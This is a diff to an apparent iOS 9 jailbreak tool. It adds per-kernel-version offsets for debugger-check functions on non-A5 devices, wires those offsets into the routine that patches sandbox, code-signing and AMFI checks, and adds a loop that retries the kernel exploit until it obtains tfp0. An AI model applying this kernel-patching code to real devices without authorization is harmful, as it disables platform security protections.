@@ -34,51 +34,95 @@ void patch_bootargs(uint32_t addr){
     kwrite_buf(bootargs_addr, bootargs_buf, bootargs_buf_len);
 }
 
-// debugger 1 and 2 for a5(x) 9.x
+// debugger 1 and 2 for 9.x
 uint32_t find_PE_i_can_has_debugger_1(void) {
     uint32_t PE_i_can_has_debugger_1;
-    if (strstr(ckernv, "3248.61")) {
-        print_log("9.3.5-9.3.6\n");
-        PE_i_can_has_debugger_1 = 0x3a82c4;
-    } else if (strstr(ckernv, "3248.60")) {
-        print_log("9.3.3-9.3.4\n");
-        PE_i_can_has_debugger_1 = 0x3a82d4;
-    } else if (strstr(ckernv, "3248.50")) {
-        print_log("9.3.2\n");
-        PE_i_can_has_debugger_1 = 0x3a7ff4;
-    } else if (strstr(ckernv, "3248.41")) {
-        print_log("9.3-9.3.1\n");
-        PE_i_can_has_debugger_1 = 0x3a7ea4;
-    } else if (strstr(ckernv, "3248.31")) {
-        print_log("9.2.1\n");
-        PE_i_can_has_debugger_1 = 0x3a1434;
-    } else if (strstr(ckernv, "3248.21")) {
-        print_log("9.2\n");
-        PE_i_can_has_debugger_1 = 0x3a12c4;
-    } else if (strstr(ckernv, "3248.10")) {
-        print_log("9.1\n");
-        PE_i_can_has_debugger_1 = 0x3aa734;
+    if (isA5) {
+        if (strstr(ckernv, "3248.61")) {
+            print_log("9.3.5-9.3.6\n");
+            PE_i_can_has_debugger_1 = 0x3a82c4;
+        } else if (strstr(ckernv, "3248.60")) {
+            print_log("9.3.3-9.3.4\n");
+            PE_i_can_has_debugger_1 = 0x3a82d4;
+        } else if (strstr(ckernv, "3248.50")) {
+            print_log("9.3.2\n");
+            PE_i_can_has_debugger_1 = 0x3a7ff4;
+        } else if (strstr(ckernv, "3248.41")) {
+            print_log("9.3-9.3.1\n");
+            PE_i_can_has_debugger_1 = 0x3a7ea4;
+        } else if (strstr(ckernv, "3248.31")) {
+            print_log("9.2.1\n");
+            PE_i_can_has_debugger_1 = 0x3a1434;
+        } else if (strstr(ckernv, "3248.21")) {
+            print_log("9.2\n");
+            PE_i_can_has_debugger_1 = 0x3a12c4;
+        } else if (strstr(ckernv, "3248.10")) {
+            print_log("9.1\n");
+            PE_i_can_has_debugger_1 = 0x3aa734;
+        } else {
+            print_log("9.0-9.0.2\n");
+            PE_i_can_has_debugger_1 = 0x3a8fc4;
+        }
     } else {
-        print_log("9.0-9.0.2\n");
-        PE_i_can_has_debugger_1 = 0x3a8fc4;
+        if (strstr(ckernv, "3248.61")) {
+            print_log("9.3.5-9.3.6\n");
+            PE_i_can_has_debugger_1 = 0x3afee4;
+        } else if (strstr(ckernv, "3248.60")) {
+            print_log("9.3.3-9.3.4\n");
+            PE_i_can_has_debugger_1 = 0x3aff14;
+        } else if (strstr(ckernv, "3248.50")) {
+            print_log("9.3.2\n");
+            PE_i_can_has_debugger_1 = 0x3afb14;
+        } else if (strstr(ckernv, "3248.41")) {
+            print_log("9.3-9.3.1\n");
+            PE_i_can_has_debugger_1 = 0x3afaf4;
+        } else if (strstr(ckernv, "3248.31")) {
+            print_log("9.2.1\n");
+            PE_i_can_has_debugger_1 = 0x3a8764;
+        } else if (strstr(ckernv, "3248.21")) {
+            print_log("9.2\n");
+            PE_i_can_has_debugger_1 = 0x3a85e4;
+        } else if (strstr(ckernv, "3248.10")) {
+            print_log("9.1\n");
+            PE_i_can_has_debugger_1 = 0x3b0694;
+        } else {
+            print_log("9.0-9.0.2\n");
+            PE_i_can_has_debugger_1 = 0x3af014;
+        }
     }
     return PE_i_can_has_debugger_1;
 }
 
 uint32_t find_PE_i_can_has_debugger_2(void) {
     uint32_t PE_i_can_has_debugger_2;
-    if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
-        print_log("9.3.x\n");
-        PE_i_can_has_debugger_2 = 0x456070;
-    } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
-        print_log("9.2-9.2.1\n");
-        PE_i_can_has_debugger_2 = 0x44f070;
-    } else if (strstr(ckernv, "3248.10")) {
-        print_log("9.1\n");
-        PE_i_can_has_debugger_2 = 0x457860;
+    if (isA5) {
+        if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+            print_log("9.3.x\n");
+            PE_i_can_has_debugger_2 = 0x456070;
+        } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
+            print_log("9.2-9.2.1\n");
+            PE_i_can_has_debugger_2 = 0x44f070;
+        } else if (strstr(ckernv, "3248.10")) {
+            print_log("9.1\n");
+            PE_i_can_has_debugger_2 = 0x457860;
+        } else {
+            print_log("9.0-9.0.2\n");
+            PE_i_can_has_debugger_2 = 0x4567d0;
+        }
     } else {
-        print_log("9.0-9.0.2\n");
-        PE_i_can_has_debugger_2 = 0x4567d0;
+        if (strstr(ckernv, "3248.6") || strstr(ckernv, "3248.5") || strstr(ckernv, "3248.4")) {
+            print_log("9.3.x\n");
+            PE_i_can_has_debugger_2 = 0x45e1a0;
+        } else if (strstr(ckernv, "3248.31") || strstr(ckernv, "3248.21")) {
+            print_log("9.2-9.2.1\n");
+            PE_i_can_has_debugger_2 = 0x456190;
+        } else if (strstr(ckernv, "3248.10")) {
+            print_log("9.1\n");
+            PE_i_can_has_debugger_2 = 0x45e980;
+        } else {
+            print_log("9.0-9.0.2\n");
+            PE_i_can_has_debugger_2 = 0x45c8f0;
+        }
     }
     return PE_i_can_has_debugger_2;
 }
@@ -237,20 +281,12 @@ void unjail9(void){
     uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
     uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
     uint32_t amfi_file_check_mmap = kbase + find_amfi_file_check_mmap(kbase, kdata, ksize);
-    uint32_t PE_i_can_has_debugger_1;
-    uint32_t PE_i_can_has_debugger_2;
+    uint32_t PE_i_can_has_debugger_1 = kbase + find_PE_i_can_has_debugger_1();
+    uint32_t PE_i_can_has_debugger_2 = kbase + find_PE_i_can_has_debugger_2();
     uint32_t mount_patch;
     uint32_t mapForIO;
     uint32_t i_can_has_kernel_configuration_got;
     uint32_t lwvm_jump;
-
-    if (isA5) {
-        PE_i_can_has_debugger_1 = kbase + find_PE_i_can_has_debugger_1();
-        PE_i_can_has_debugger_2 = kbase + find_PE_i_can_has_debugger_2();
-    } else {
-        PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1_90(kbase, kdata, ksize);
-        PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2_90(kbase, kdata, ksize);
-    }
 
     if (strstr(ckernv, "3248.1.")) {
         mount_patch = kbase + find_mount_90(kbase, kdata, ksize);
@@ -455,7 +491,16 @@ void failed(void){
 int main(void){
     jailbreak_init();
 
-    run_exploit(1024);
+    // hack, to just keep trying until it succeeds somehow
+    int ool_count = 1000;
+    int ret = -1;
+    while (ool_count >= 100 && ret != 0) {
+        print_log("[*] ool_count = %d\n", ool_count);
+        ret = run_exploit(ool_count);
+        if (ret == 0) break;
+        ool_count -= 100;
+        usleep(20000);
+    }
 
     if(kinfo->tfp0){
         print_log("[*] got tfp0: %x\n", kinfo->tfp0);
